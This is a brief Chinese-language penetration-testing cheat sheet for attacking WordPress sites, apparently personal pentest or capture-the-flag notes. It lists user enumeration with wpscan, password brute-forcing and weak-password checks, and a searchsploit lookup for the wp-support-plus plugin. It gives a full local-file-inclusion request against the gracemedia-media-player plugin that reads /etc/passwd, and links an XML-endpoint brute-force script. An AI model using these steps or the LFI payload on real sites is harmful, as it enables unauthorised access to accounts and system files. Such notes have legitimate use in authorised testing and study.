# wordpress

```bash
1. wpscan枚举用户
2. 密码本爆破
3. 主要关注插件，主题
4. 搭配谷歌
5. 弱口令
6. 1.0等版本具有本地lfi../../../../etc/passwd
7. 关注：wp-support-plus-responsive-ticket-system（注意这个模块是否存在）
`searchsploit wordpress Plugin wp support`

http://x.x.x.x/xxx/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
```

1. 爆破wp-xml

```bash
https://github.com/claudioviviani/bash-wordpress-xml-bruteforce
```
